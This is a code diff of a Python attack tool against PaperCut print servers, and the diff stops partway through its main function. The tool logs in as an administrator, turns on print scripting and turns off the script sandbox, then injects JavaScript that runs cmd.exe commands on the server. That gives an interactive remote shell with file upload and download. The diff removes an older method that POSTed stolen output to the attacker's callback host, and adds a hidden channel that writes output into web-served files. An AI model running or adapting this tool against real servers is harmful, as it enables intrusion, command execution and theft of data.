@@ -1,31 +1,37 @@
 #!/usr/bin/python3
-import argparse
-import base64
-import os
-import queue
-import socket
-import sys
-import threading
-
-import requests
-import urllib3
-from http.server import BaseHTTPRequestHandler, HTTPServer
+import argparse, base64, os, shlex, sys, time, uuid
+import requests, urllib3
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 
-# ----------------------------------------------------------------------------
-# Auth (reuse YOUR working login; cookie option is the most reliable shortcut)
-# ----------------------------------------------------------------------------
+def js_str(s):
+    """Single-quoted, safe JavaScript string literal (backslash/quote/unicode escaped)."""
+    out = []
+    for ch in s:
+        o = ord(ch)
+        if ch == '\\': out.append('\\\\')
+        elif ch == "'": out.append("\\'")
+        elif ch == '\n': out.append('\\n')
+        elif ch == '\r': out.append('\\r')
+        elif ch == '\t': out.append('\\t')
+        elif o < 32 or o == 127 or o > 126: out.append('\\u%04x' % o)
+        else: out.append(ch)
+    return "'" + ''.join(out) + "'"
+
+
+def js_strlist(items):
+    return '[' + ', '.join(js_str(i) for i in items) + ']'
+
+
+# ---------------------------------------------------------------- auth ------
 def get_session_id(base_url, username=None, password=None, jsessionid=None):
     s = requests.Session()
     if jsessionid:
         s.cookies.set('JSESSIONID', jsessionid)
-        print('[+] Reusing provided JSESSIONID cookie')
+        print('[+] Reusing JSESSIONID cookie')
         return s
-
-    # Version-specific: verify these field names against your login page.
-    r = s.get(f'{base_url}/app?service=page/Login', verify=False)
+    s.get(f'{base_url}/app?service=page/Login', verify=False)
     data = {
         'service': 'direct/1/Login/$Form',
         'sp': 'S0',
@@ -35,152 +41,132 @@ def get_session_id(base_url, username=None, password=None, jsessionid=None):
         '$Checkbox$0': 'on',
         '$SubmitName': 'Login',
     }
-    r = s.post(f'{base_url}/app', data=data,
-               headers={'Origin': f'{base_url}'}, verify=False)
+    r = s.post(f'{base_url}/app', data=data, headers={'Origin': base_url}, verify=False)
     if r.status_code == 200 and 'JSESSIONID' in s.cookies.get_dict():
         print(f'[+] Authenticated as {username}')
         return s
-    print('[-] Login failed. Use --cookie <JSESSIONID> from your browser session instead.')
+    print('[-] Login failed — use --cookie <JSESSIONID>')
     return None
 
 
-# ----------------------------------------------------------------------------
-# Config toggles (unchanged from your script)
-# ----------------------------------------------------------------------------
+# ------------------------------------------- config toggles (your PoC keys) --
 def set_setting(base_url, session, setting, enabled):
-    print(f'[*] Updating {setting} -> {enabled}')
-    headers = {'Origin': f'{base_url}'}
-    data = {
+    headers = {'Origin': base_url}
+    session.post(f'{base_url}/app', data={
         'service': 'direct/1/ConfigEditor/quickFindForm',
         'sp': 'S0',
         'Form0': '$TextField,doQuickFind,clear',
         '$TextField': setting,
-        'doQuickFind': 'Go'
-    }
-    session.post(f'{base_url}/app', data=data, headers=headers, verify=False)
-
-    data = {
+        'doQuickFind': 'Go'}, headers=headers, verify=False)
+    session.post(f'{base_url}/app', data={
         'service': 'direct/1/ConfigEditor/$Form',
         'sp': 'S1',
         'Form1': '$TextField$0,$Submit,$Submit$0',
         '$TextField$0': enabled,
-        '$Submit': 'Update'
+        '$Submit': 'Update'}, headers=headers, verify=False)
+
+
+# ------------------------------------------------- JS templates (Rhino) -------
+JS_DISCOVER = r'''
+function pcd_dirs() {
+  var out = new java.util.ArrayList();
+  var seen = new java.util.HashSet();
+  function add(path, mustExist) {
+    if (path == null) { return; }
+    var d = new java.io.File(path);
+    var k = d.getPath();
+    if (seen.contains(k)) { return; }
+    seen.add(k);
+    if (mustExist && !d.exists()) { return; }
+    out.add(d);
+  }
+  var names = ['Program Files\\PaperCut MF','Program Files (x86)\\PaperCut MF','PaperCut MF',
+               'Program Files\\PaperCut NG','Program Files (x86)\\PaperCut NG','PaperCut NG'];
+  for (var c = 67; c <= 90; c++) {
+    var root = String.fromCharCode(c) + ':\\';
+    for (var n = 0; n < names.length; n++) {
+      var base = new java.io.File(root + names[n]);
+      if (base.isDirectory()) { add(base.getPath() + '\\server\\custom\\web', false); }
     }
-    session.post(f'{base_url}/app', data=data, headers=headers, verify=False)
-
-
-# ----------------------------------------------------------------------------
-# Staging + injection (the printer-select dance from your original execute())
-# ----------------------------------------------------------------------------
-def stage_and_inject(base_url, session, script_body):
-    headers = {'Origin': f'{base_url}'}
-    session.get(f'{base_url}/app?service=page/PrinterList',
-                data={'service': 'page/PrinterList'}, headers=headers, verify=False)
-    session.get(f'{base_url}/app?service=direct/1/PrinterList/selectPrinter&sp=l1001',
-                data={'service': 'direct/1/PrinterList/selectPrinter', 'sp': 'l1001'},
-                headers=headers, verify=False)
-    session.get(f'{base_url}/app',
-                data={'service': 'direct/1/PrinterDetails/printerOptionsTab.tab', 'sp': '4'},
-                headers=headers, verify=False)
-
-    data = {
-        'service': 'direct/1/PrinterDetails/$PrinterDetailsScript.$Form',
-        'sp': 'S0',
-        'Form0': 'printerId,enablePrintScript,scriptBody,$Submit,$Submit$0,$Submit$1',
-        'printerId': 'l1001',
-        'enablePrintScript': 'on',
-        'scriptBody': script_body,
-        '$Submit$1': 'Apply',
+  }
+  var paths = [];
+  var cp = java.lang.System.getProperty('java.class.path');
+  if (cp != null && cp.length > 0) {
+    var ents = cp.split(java.util.regex.Pattern.quote(java.io.File.pathSeparator));
+    for (var i = 0; i < ents.length; i++) { paths.push(ents[i]); }
+  }
+  paths.push(java.lang.System.getProperty('user.dir'));
+  for (var j = 0; j < paths.length; j++) {
+    var f = new java.io.File(paths[j]);
+    if (!f.isAbsolute()) { continue; }
+    if (!f.isDirectory()) { f = f.getParentFile(); }
+    var p = f;
+    while (p != null) {
+      var cust = new java.io.File(p, 'custom');
+      if (cust.isDirectory()) { add(cust.getPath() + '\\web', false); break; }
+      p = p.getParentFile();
     }
-    r = session.post(f'{base_url}/app', data=data, headers=headers, verify=False)
-    return r
+  }
+  return out;
+}
+function pcd_write(fname, contentStr) {
+  var bytes = contentStr.getBytes('UTF-8');
+  var dirs = new java.util.ArrayList();
+  if (__WEBDIR__ != '') { dirs.add(new java.io.File(__WEBDIR__)); }
+  else { dirs = pcd_dirs(); }
+  for (var i = 0; i < dirs.size(); i++) {
+    try {
+      var d = dirs.get(i);
+      if (!d.exists()) { d.mkdirs(); }
+      java.nio.file.Files.write(java.nio.file.Paths.get(d.getPath(), fname), bytes);
+    } catch (e) {}
+  }
+}
+function pcd_write_append(fname, contentStr) {
+  var bytes = contentStr.getBytes('UTF-8');
+  var dirs = new java.util.ArrayList();
+  if (__WEBDIR__ != '') { dirs.add(new java.io.File(__WEBDIR__)); }
+  else { dirs = pcd_dirs(); }
+  for (var i = 0; i < dirs.size(); i++) {
+    try {
+      var d = dirs.get(i);
+      if (!d.exists()) { d.mkdirs(); }
+      java.nio.file.Files.write(java.nio.file.Paths.get(d.getPath(), fname), bytes,
+        java.nio.file.StandardOpenOption.CREATE,
+        java.nio.file.StandardOpenOption.APPEND,
+        java.nio.file.StandardOpenOption.WRITE);
+    } catch (e) {}
+  }
+}
+'''
 
+JS_HOOK = 'function printJobHook(inputs, actions) {}\r\n'
 
-# ----------------------------------------------------------------------------
-# Exfil listener (receives base64 payloads back from the target)
-# ----------------------------------------------------------------------------
-class ExfilHandler(BaseHTTPRequestHandler):
-    results = queue.Queue()
-
-    def do_POST(self):
-        length = int(self.headers.get('Content-Length', 0))
-        body = self.rfile.read(length)
-        self.send_response(200)
-        self.end_headers()
-        self.wfile.write(b'ok')
-        ExfilHandler.results.put(body)
-
-    def log_message(self, *args):
-        pass
-
-
-class ExfilServer(threading.Thread):
-    def __init__(self, port):
-        super().__init__(daemon=True)
-        self.port = port
-
-    def run(self):
-        HTTPServer(('0.0.0.0', self.port), ExfilHandler).serve_forever()
-
-
-def drain_results():
-    try:
-        while True:
-            ExfilHandler.results.get_nowait()
-    except queue.Empty:
-        pass
-
-
-def wait_result(timeout=30):
-    try:
-        return ExfilHandler.results.get(timeout=timeout)
-    except queue.Empty:
-        return None
-
-
-# ----------------------------------------------------------------------------
-# JS helpers
-# ----------------------------------------------------------------------------
-def js_str(s):
-    """Safe single-quoted JavaScript string literal."""
-    out = []
-    for ch in s:
-        if ch == '\\':
-            out.append('\\\\')
-        elif ch == "'":
-            out.append("\\'")
-        elif ch == '\r':
-            out.append('\\r')
-        elif ch == '\n':
-            out.append('\\n')
-        elif ch == '\t':
-            out.append('\\t')
-        else:
-            cp = ord(ch)
-            out.append(('\\u%04x' % cp) if (cp < 32 or cp == 127) else ch)
-    return "'" + ''.join(out) + "'"
-
-
-def local_ip():
-    try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        sock.connect(('8.8.8.8', 80))
-        ip = sock.getsockname()[0]
-        sock.close()
-        return ip
-    except OSError:
-        return '127.0.0.1'
-
-
-JS_CMD = r"""
-function printJobHook(inputs, actions) {}
+JS_PROBE = '''
 try {
-  var osName = java.lang.System.getProperty('os.name').toLowerCase();
-  var shell = (osName.indexOf('win') >= 0) ? 'cmd.exe' : '/bin/bash';
-  var flag  = (osName.indexOf('win') >= 0) ? '/c' : '-c';
+  var dirs = pcd_dirs();
+  var osname = java.lang.System.getProperty('os.name');
+  var ud = java.lang.System.getProperty('user.dir');
+  var jv = java.lang.System.getProperty('java.version');
+  for (var i = 0; i < dirs.size(); i++) {
+    var d = dirs.get(i);
+    try {
+      if (!d.exists()) { d.mkdirs(); }
+      var payload = 'WEB|' + d.getPath() + '|' + osname + '|' + ud + '|' + jv;
+      java.nio.file.Files.write(java.nio.file.Paths.get(d.getPath(), __FILE__), payload.getBytes('UTF-8'));
+    } catch (e) {}
+  }
+} catch (e) {}
+'''
+
+JS_EXEC = '''
+try {
   var pb = new java.lang.ProcessBuilder();
-  pb.command(java.util.Arrays.asList(shell, flag, __CMD__));
+  pb.command(java.util.Arrays.asList('cmd.exe', '/c', __CMD__));
   pb.redirectErrorStream(true);
+  var d = new java.io.File(__CWD__);
+  if (!d.isDirectory()) { d = new java.io.File('C:\\\\'); }
+  pb.directory(d);
   var p = pb.start();
   var bos = new java.io.ByteArrayOutputStream();
   var buf = java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, 8192);
@@ -188,219 +174,456 @@ try {
   var n;
   while ((n = ins.read(buf)) != -1) { bos.write(buf, 0, n); }
   p.waitFor();
-  var b64 = java.util.Base64.getEncoder().encodeToString(bos.toByteArray());
-  _send(b64.getBytes('UTF-8'));
+  pcd_write(__FILE__, java.util.Base64.getEncoder().encodeToString(bos.toByteArray()));
 } catch (e) {
-  _send(new java.lang.String('JS-ERROR: ' + e).getBytes('UTF-8'));
+  pcd_write(__FILE__, 'PCERR:' + e);
 }
-function _send(bytes) {
-  var url = new java.net.URL(__CB__ + '/exfil');
-  var c = url.openConnection();
-  c.setDoOutput(true);
-  c.setRequestMethod('POST');
-  c.setRequestProperty('Content-Type', 'application/octet-stream');
-  c.setRequestProperty('Content-Length', '' + bytes.length);
-  var o = c.getOutputStream();
-  o.write(bytes);
-  o.close();
-  c.getInputStream().close();
-}
-"""
+'''
 
-JS_UPLOAD = r"""
-function printJobHook(inputs, actions) {}
+JS_STAT = '''
+try {
+  var f = new java.io.File(__PATH__);
+  pcd_write(__FILE__, 'STAT|' + f.exists() + '|' + f.isFile() + '|' + f.length());
+} catch (e) { pcd_write(__FILE__, 'PCERR:' + e); }
+'''
+
+JS_UPLOAD = '''
 try {
   var data = java.util.Base64.getDecoder().decode(__B64__);
-  java.nio.file.Files.write(java.nio.file.Paths.get(__PATH__), data);
-  _send('UPLOAD_OK ' + data.length);
-} catch (e) {
-  _send('UPLOAD_ERR ' + e);
-}
-function _send(msg) {
-  var bytes = new java.lang.String(msg).getBytes('UTF-8');
-  var url = new java.net.URL(__CB__ + '/exfil');
-  var c = url.openConnection();
-  c.setDoOutput(true);
-  c.setRequestMethod('POST');
-  c.setRequestProperty('Content-Length', '' + bytes.length);
-  var o = c.getOutputStream();
-  o.write(bytes);
-  o.close();
-  c.getInputStream().close();
-}
-"""
+  if (__APPEND__) {
+    java.nio.file.Files.write(java.nio.file.Paths.get(__PATH__), data,
+      java.nio.file.StandardOpenOption.CREATE,
+      java.nio.file.StandardOpenOption.APPEND,
+      java.nio.file.StandardOpenOption.WRITE);
+  } else {
+    java.nio.file.Files.write(java.nio.file.Paths.get(__PATH__), data,
+      java.nio.file.StandardOpenOption.CREATE,
+      java.nio.file.StandardOpenOption.TRUNCATE_EXISTING,
+      java.nio.file.StandardOpenOption.WRITE);
+  }
+  pcd_write(__FILE__, 'UP|' + data.length + '|' + __OFFSET__);
+} catch (e) { pcd_write(__FILE__, 'PCERR:' + e); }
+'''
 
-JS_DOWNLOAD = r"""
-function printJobHook(inputs, actions) {}
+JS_DOWNLOAD = '''
 try {
-  var raw = java.nio.file.Files.readAllBytes(java.nio.file.Paths.get(__PATH__));
-  var b64 = java.util.Base64.getEncoder().encodeToString(raw);
-  _send(b64);
+  var raf = new java.io.RandomAccessFile(__PATH__, 'r');
+  raf.seek(__OFFSET__);
+  var want = __LEN__;
+  var buf = java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, want);
+  var total = 0; var n;
+  while (total < want) {
+    n = raf.read(buf, total, want - total);
+    if (n == -1) { break; }
+    total += n;
+  }
+  raf.close();
+  var data = java.util.Arrays.copyOf(buf, total);
+  pcd_write(__FILE__, java.util.Base64.getEncoder().encodeToString(data));
+} catch (e) { pcd_write(__FILE__, 'PCERR:' + e); }
+'''
+
+JS_DELETE = '''
+try {
+  var names = __NAMES__;
+  var dirs = new java.util.ArrayList();
+  if (__WEBDIR__ != '') { dirs.add(new java.io.File(__WEBDIR__)); }
+  else { dirs = pcd_dirs(); }
+  for (var i = 0; i < dirs.size(); i++) {
+    for (var j = 0; j < names.length; j++) {
+      try { var fl = new java.io.File(dirs.get(i), names[j]); if (fl.exists()) { fl.delete(); } } catch (e) {}
+    }
+  }
+} catch (e) {}
+'''
+
+JS_DIRLIST = r'''
+try {
+  var dirs = pcd_dirs();
+  if (dirs.size() == 0) { throw 'no custom web dir resolved'; }
+  var webdir = dirs.get(0);
+  var serverDir = webdir.getParentFile().getParentFile();   // .../server
+  var targetFile;
+  if (__PATH__ != '') {
+    targetFile = new java.io.File(__PATH__);
+  } else {
+    targetFile = new java.io.File(serverDir, 'web');        // .../server/web
+  }
+  var sb = new java.lang.StringBuilder();
+  sb.append('\r\n==== ').append(targetFile.getPath()).append(' ====\r\n');
+  var stack = new java.util.ArrayDeque();
+  stack.push(targetFile);
+  var count = 0;
+  while (!stack.isEmpty() && count < __MAX__) {
+    var f = stack.pop();
+    if (!f.exists()) { continue; }
+    var rel;
+    try { rel = targetFile.toPath().relativize(f.toPath()).toString(); }
+    catch (e) { rel = f.getPath(); }
+    if (f.isDirectory()) {
+      sb.append('D\t').append(rel).append('\r\n');
+    } else {
+      sb.append('F\t').append(rel).append('\t').append(f.length()).append('B\r\n');
+    }
+    count++;
+    if (f.isDirectory()) {
+      var kids = f.listFiles();
+      if (kids != null) {
+        for (var k = 0; k < kids.length; k++) { stack.push(kids[k]); }
+      }
+    }
+  }
+  pcd_write_append(__FILE__, sb.toString());
 } catch (e) {
-  _send('DOWNLOAD_ERR ' + e);
+  pcd_write_append(__FILE__, 'PCERR: ' + e + '\r\n');
 }
-function _send(msg) {
-  var bytes = new java.lang.String(msg).getBytes('UTF-8');
-  var url = new java.net.URL(__CB__ + '/exfil');
-  var c = url.openConnection();
-  c.setDoOutput(true);
-  c.setRequestMethod('POST');
-  c.setRequestProperty('Content-Length', '' + bytes.length);
-  var o = c.getOutputStream();
-  o.write(bytes);
-  o.close();
-  c.getInputStream().close();
-}
-"""
+'''
 
 
-# ----------------------------------------------------------------------------
-# Operations
-# ----------------------------------------------------------------------------
-def run_command(base_url, session, callback, command):
-    script = (JS_CMD
-              .replace('__CMD__', js_str(command))
-              .replace('__CB__', js_str(callback)))
-    drain_results()
-    r = stage_and_inject(base_url, session, script)
-    if not (r.status_code == 200 and 'Saved successfully' in r.text):
-        print('[-] Script apply reported failure (it may still have executed)')
+class PaperCutShell:
+    def __init__(self, base_url, session, webdir=None, chunk=262144):
+        self.base_url = base_url.rstrip('/')
+        self.session = session
+        self.webdir = webdir
+        self.chunk = chunk
+        self.token = uuid.uuid4().hex[:8]
+        self.probe_fname = f'pcsh_probe_{self.token}.txt'
+        self.out_fname = f'pcsh_out_{self.token}.txt'
+        self.cwd = 'C:\\'
+        self.javaversion = '?'
 
-    res = wait_result()
-    if res is None:
-        print('[-] No callback: command likely exceeded the ~5s script timeout, '
-              'or the callback URL is not reachable from the target.')
-        return
-    print(res.decode('utf-8', errors='replace'))
+    # -- low-level ----------------------------------------------------------
+    def _apply(self, script_body):
+        b = self.base_url
+        headers = {'Origin': self.base_url}
+        self.session.get(f'{b}/app?service=page/PrinterList',
+                         data={'service': 'page/PrinterList'}, headers=headers, verify=False)
+        self.session.get(f'{b}/app?service=direct/1/PrinterList/selectPrinter&sp=l1001',
+                         data={'service': 'direct/1/PrinterList/selectPrinter', 'sp': 'l1001'},
+                         headers=headers, verify=False)
+        self.session.get(f'{b}/app',
+                         data={'service': 'direct/1/PrinterDetails/printerOptionsTab.tab', 'sp': '4'},
+                         headers=headers, verify=False)
+        data = {
+            'service': 'direct/1/PrinterDetails/$PrinterDetailsScript.$Form',
+            'sp': 'S0',
+            'Form0': 'printerId,enablePrintScript,scriptBody,$Submit,$Submit$0,$Submit$1',
+            'printerId': 'l1001',
+            'enablePrintScript': 'on',
+            'scriptBody': script_body,
+            '$Submit$1': 'Apply',
+        }
+        r = self.session.post(f'{b}/app', data=data, headers=headers, verify=False)
+        return r.status_code == 200 and ('Saved successfully' in r.text)
+
+    def _pre(self):
+        return JS_DISCOVER.replace('__WEBDIR__', js_str(self.webdir or ''))
+
+    def _read(self, fname):
+        url = f'{self.base_url}/custom/{fname}'
+        for _ in range(4):
+            try:
+                r = self.session.get(url, verify=False, timeout=30)
+                if r.status_code == 200:
+                    body = r.content
+                    low = body[:256].lower()
+                    if body and (low.startswith(b'<!doctype') or low.startswith(b'<html')):
+                        time.sleep(0.4); continue
+                    return body
+            except requests.RequestException:
+                pass
+            time.sleep(0.4)
+        return None
+
+    def _decode(self, raw):
+        for enc in ('cp437', 'cp1252', 'utf-8'):
+            try:
+                return raw.decode(enc)
+            except UnicodeDecodeError:
+                continue
+        return raw.decode('latin-1', 'replace')
+
+    # -- discovery ----------------------------------------------------------
+    def discover(self):
+        if self.webdir:
+            return True
+        script = JS_DISCOVER.replace('__WEBDIR__', "''") + \
+                 JS_PROBE.replace('__FILE__', js_str(self.probe_fname))
+        self._apply(script)
+        body = self._read(self.probe_fname)
+        if not body:
+            return False
+        txt = body.decode('utf-8', 'replace')
+        if not txt.startswith('WEB|'):
+            return False
+        parts = txt.split('|')
+        if len(parts) >= 5:
+            self.webdir = parts[1]
+            self.javaversion = parts[4]
+            # start shell in the JVM's working dir so paths feel native
+            if '\\' in parts[3]:
+                self.cwd = parts[3]
+        return bool(self.webdir)
+
+    # -- command execution ---------------------------------------------------
+    def exec_raw(self, command):
+        script = self._pre() + JS_EXEC \
+            .replace('__CMD__', js_str(command)) \
+            .replace('__CWD__', js_str(self.cwd)) \
+            .replace('__FILE__', js_str(self.out_fname))
+        self._apply(script)
+        body = self._read(self.out_fname)
+        if body is None:
+            return None
+        if body.startswith(b'PCERR'):
+            return '<script-error> ' + body.decode('utf-8', 'replace')
+        try:
+            raw = base64.b64decode(body)
+        except Exception:
+            return body.decode('utf-8', 'replace')
+        return self._decode(raw)
+
+    # -- upload / download ---------------------------------------------------
+    def upload(self, local, remote):
+        if not os.path.isfile(local):
+            print(f'[-] no such file: {local}')
+            return
+        data = open(local, 'rb').read()
+        total = len(data)
+        off = 0
+        while off < total:
+            part = data[off:off + self.chunk]
+            b64 = base64.b64encode(part).decode('ascii')
+            script = self._pre() + JS_UPLOAD \
+                .replace('__B64__', js_str(b64)) \
+                .replace('__PATH__', js_str(remote)) \
+                .replace('__APPEND__', 'true' if off else 'false') \
+                .replace('__OFFSET__', str(off)) \
+                .replace('__FILE__', js_str(self.out_fname))
+            self._apply(script)
+            off += len(part)
+        # verify final size
+        script = self._pre() + JS_STAT \
+            .replace('__PATH__', js_str(remote)) \
+            .replace('__FILE__', js_str(self.out_fname))
+        self._apply(script)
+        t = self._read(self.out_fname)
+        if t and t.startswith(b'STAT|'):
+            p = t.decode().split('|')
+            actual = int(p[3]) if len(p) > 3 and p[2] == 'true' else -1
+            ok = 'OK' if actual == total else 'MISMATCH (remote=%s)' % actual
+            print(f'[+] upload {ok}: {total} bytes -> {remote}')
+        else:
+            print(f'[+] upload finished (verification unavailable): {total} bytes -> {remote}')
+
+    def download(self, remote, local):
+        script = self._pre() + JS_STAT \
+            .replace('__PATH__', js_str(remote)) \
+            .replace('__FILE__', js_str(self.out_fname))
+        self._apply(script)
+        t = self._read(self.out_fname)
+        if not t:
+            print('[-] cannot stat remote file (channel unavailable?)')
+            return
+        if t.startswith(b'PCERR'):
+            print('[-] ' + t.decode())
+            return
+        p = t.decode().split('|')
+        if len(p) < 4 or p[1] != 'true' or p[2] != 'true':
+            print(f'[-] not a readable file: {remote}')
+            return
+        length = int(p[3])
+        with open(local, 'wb') as f:
+            off = 0
+            while off < length:
+                ln = min(self.chunk, length - off)
+                script = self._pre() + JS_DOWNLOAD \
+                    .replace('__PATH__', js_str(remote)) \
+                    .replace('__OFFSET__', str(off)) \
+                    .replace('__LEN__', str(ln)) \
+                    .replace('__FILE__', js_str(self.out_fname))
+                self._apply(script)
+                b = self._read(self.out_fname)
+                if not b:
+                    print('[-] chunk read failed'); return
+                if b.startswith(b'PCERR'):
+                    print('[-] ' + b.decode()); return
+                try:
+                    f.write(base64.b64decode(b))
+                except Exception:
+                    print('[-] bad base64 chunk'); return
+                off += ln
+        print(f'[+] download complete: {length} bytes -> {local}')
+
+    # -- directory listing helper --------------------------------------------
+    def dirlist(self, path=''):
+        script = self._pre() + JS_DIRLIST \
+            .replace('__PATH__', js_str(path)) \
+            .replace('__MAX__', '10000') \
+            .replace('__FILE__', js_str('list.txt'))
+        self._apply(script)
+        body = self._read('list.txt')
+        if body is None:
+            print('[-] list.txt not retrievable from /custom/')
+            return
+        print(f'[+] listing appended -> {self.base_url}/custom/list.txt '
+              f'({len(body)} bytes)')
+        print(self._decode(body)[-1500:])
+
+    # -- cd emulation --------------------------------------------------------
+    def _norm_path(self, p):
+        p = p.replace('/', '\\')
+        drive = self.cwd[:2] if (len(self.cwd) >= 2 and self.cwd[1] == ':') else 'C:'
+        if len(p) >= 2 and p[1] == ':':
+            drive, rest = p[:2], p[2:].lstrip('\\')
+        else:
+            rest = p
+        stack = []
+        for seg in rest.split('\\'):
+            if seg in ('', '.'): continue
+            if seg == '..':
+                if stack: stack.pop()
+            else:
+                stack.append(seg)
+        return drive + '\\' + '\\'.join(stack)
+
+    def do_cd(self, arg):
+        arg = arg.strip().strip('"')
+        if not arg:
+            return self.cwd
+        if arg in ('\\', '/'):
+            self.cwd = (self.cwd[:2] if self.cwd[1:2] == ':' else 'C:') + '\\'
+            return self.cwd
+        if arg.startswith('\\\\'):
+            self.cwd = arg
+        else:
+            self.cwd = self._norm_path(arg)
+        return self.cwd
+
+    # -- banner / loop --------------------------------------------------------
+    def banner(self):
+        who = self.exec_raw('whoami') or ''
+        host = self.exec_raw('hostname') or ''
+        self.cwd = (self.exec_raw('cd') or '').strip() or self.cwd
+        print('[+] Connected over the HTTP request/response channel '
+              '(no reverse connection required)')
+        print(f'    Target : {self.base_url}')
+        print(f'    User   : {who.strip()}')
+        print(f'    Host   : {host.strip()}')
+        print(f'    CWD    : {self.cwd}')
+        print(f'    Java   : {self.javaversion}')
+        print('  Built-ins:  upload <local> <remote> | download <remote> <local>')
+        print('              dirlist [path] | cd <dir> | help | exit')
+        print('  Everything else is executed by cmd.exe in the remote CWD.\n')
+
+    def interactive(self):
+        self.banner()
+        while True:
+            try:
+                line = input(f'{self.cwd}> ').strip()
+            except (EOFError, KeyboardInterrupt):
+                print()
+                break
+            if not line:
+                continue
+            low = line.lower()
+            if low in ('exit', 'quit'):
+                break
+            if low == 'help':
+                print('upload <local> <remote>    push a file to the target')
+                print('download <remote> <local>  pull a file from the target')
+                print('dirlist [path]             append a recursive listing to list.txt (default: server\\web)')
+                print('cd <dir>                   change remote working directory')
+                print('exit                       restore settings and quit')
+                continue
+            if low.startswith('upload '):
+                toks = shlex.split(line[7:])
+                if len(toks) != 2:
+                    print('usage: upload <local> <remote>')
+                else:
+                    self.upload(toks[0], toks[1])
+                continue
+            if low.startswith('download '):
+                toks = shlex.split(line[9:])
+                if len(toks) != 2:
+                    print('usage: download <remote> <local>')
+                else:
+                    self.download(toks[0], toks[1])
+                continue
+            if low in ('cd', 'cd '):
+                print(self.cwd)
+                continue
+            if low.startswith('cd '):
+                print(self.do_cd(line[3:]))
+                continue
+            if low in ('dirlist', 'dirlist '):
+                self.dirlist()
+                continue
+            if low.startswith('dirlist '):
+                self.dirlist(line[8:].strip().strip('"'))
+                continue
+            out = self.exec_raw(line)
+            if out is None:
+                print('[-] no output (script timeout or /custom/ channel failed)')
+            else:
+                print(out, end='')
+
+    # -- cleanup --------------------------------------------------------------
+    def cleanup(self):
+        print('[*] cleaning up: removing exfil files, restoring script + sandbox')
+        try:
+            names = js_strlist([self.probe_fname, self.out_fname, 'list.txt'])
+            script = (JS_DISCOVER + JS_DELETE) \
+                .replace('__WEBDIR__', js_str(self.webdir or '')) \
+                .replace('__NAMES__', names)
+            self._apply(script)
+        except Exception:
+            pass
+        try:
+            self._apply(JS_HOOK)
+        except Exception:
+            pass
+        set_setting(self.base_url, self.session, 'print-and-device.script.enabled', 'N')
+        set_setting(self.base_url, self.session, 'print.script.sandboxed', 'Y')
 
 
-def upload_file(base_url, session, callback, local, remote):
-    if not os.path.exists(local):
-        print(f'[-] Local file not found: {local}')
-        return
-    with open(local, 'rb') as f:
-        b64 = base64.b64encode(f.read()).decode('ascii')
-    if len(b64) > 1_500_000:
-        print(f'[!] {local} is large ({len(b64)} b64 chars). '
-              'Keep uploads small; the Rhino engine times out after ~5s.')
-
-    script = (JS_UPLOAD
-              .replace('__B64__', js_str(b64))
-              .replace('__PATH__', js_str(remote))
-              .replace('__CB__', js_str(callback)))
-    drain_results()
-    r = stage_and_inject(base_url, session, script)
-    if not (r.status_code == 200 and 'Saved successfully' in r.text):
-        print('[-] Script apply reported failure')
-    res = wait_result()
-    print(res.decode('utf-8', errors='replace') if res else '[-] No callback received')
-
-
-def download_file(base_url, session, callback, remote, local):
-    script = (JS_DOWNLOAD
-              .replace('__PATH__', js_str(remote))
-              .replace('__CB__', js_str(callback)))
-    drain_results()
-    r = stage_and_inject(base_url, session, script)
-    if not (r.status_code == 200 and 'Saved successfully' in r.text):
-        print('[-] Script apply reported failure')
-    res = wait_result()
-    if res is None:
-        print('[-] No callback received')
-        return
-    text = res.decode('utf-8', errors='replace')
-    if text.startswith('DOWNLOAD_ERR'):
-        print(f'[-] {text}')
-        return
-    try:
-        data = base64.b64decode(res)
-    except Exception:
-        print(f'[-] Unexpected response: {text[:200]}')
-        return
-    with open(local, 'wb') as f:
-        f.write(data)
-    print(f'[+] Download OK: {len(data)} bytes -> {local}')
-
-
-def cleanup(base_url, session):
-    print('[*] Cleanup: restoring harmless script and re-enabling sandbox')
-    try:
-        stage_and_inject(base_url, session, 'function printJobHook(inputs, actions) {}\r\n')
-        set_setting(base_url, session, 'print-and-device.script.enabled', 'N')
-        set_setting(base_url, session, 'print.script.sandboxed', 'Y')
-    except Exception as e:
-        print(f'[!] Cleanup incomplete: {e}')
-
-
-# ----------------------------------------------------------------------------
-# Entry point
-# ----------------------------------------------------------------------------
-if __name__ == '__main__':
-    parser = argparse.ArgumentParser(
-        description='PaperCut authenticated-admin print-script shell (lab use only)')
-    parser.add_argument('-u', '--url', required=True, help='PaperCut base URL')
-    parser.add_argument('-U', '--username', help='Admin username (login form)')
-    parser.add_argument('-P', '--password', help='Admin password (login form)')
-    parser.add_argument('--cookie', help='JSESSIONID value to reuse an existing session')
-    parser.add_argument('--callback', help='URL reachable from the target, e.g. http://10.0.40.83:8081')
-    parser.add_argument('--lport', type=int, default=8081, help='Port to listen on for callbacks')
-    parser.add_argument('-c', '--command', help='Run one command and exit (non-interactive)')
-    args = parser.parse_args()
+def main():
+    ap = argparse.ArgumentParser(description='PaperCut authenticated print-script shell '
+                                             'using only the HTTP request/response channel')
+    ap.add_argument('-u', '--url', required=True, help='PaperCut base URL')
+    ap.add_argument('-U', '--username', help='admin username')
+    ap.add_argument('-P', '--password', help='admin password')
+    ap.add_argument('--cookie', help='JSESSIONID to reuse an existing admin session')
+    ap.add_argument('--webdir', help='absolute path to [app-path]/server/custom/web (skip autodiscovery)')
+    ap.add_argument('--chunk', type=int, default=262144, help='file transfer chunk size in bytes')
+    ap.add_argument('-c', '--command', help='run one command and exit (non-interactive)')
+    args = ap.parse_args()
 
     sess = get_session_id(args.url, args.username, args.password, args.cookie)
     if not sess:
         sys.exit(1)
 
-    callback = args.callback or f'http://{local_ip()}:{args.lport}'
-    ExfilServer(args.lport).start()
+    sh = PaperCutShell(args.url, sess, webdir=args.webdir, chunk=args.chunk)
+
+    print('[*] Enabling print scripting + disabling the sandbox (temporarily)')
+    set_setting(args.url, sess, 'print-and-device.script.enabled', 'Y')
+    set_setting(args.url, sess, 'print.script.sandboxed', 'N')
 
     try:
-        set_setting(args.url, sess, 'print-and-device.script.enabled', 'Y')
-        set_setting(args.url, sess, 'print.script.sandboxed', 'N')
+        if not sh.discover():
+            print('[!] Could not locate /custom/ channel automatically. '
+                  'Pass --webdir "C:\\Program Files\\PaperCut MF\\server\\custom\\web".')
+        else:
+            print(f'[+] custom/web exfil dir: {sh.webdir}')
 
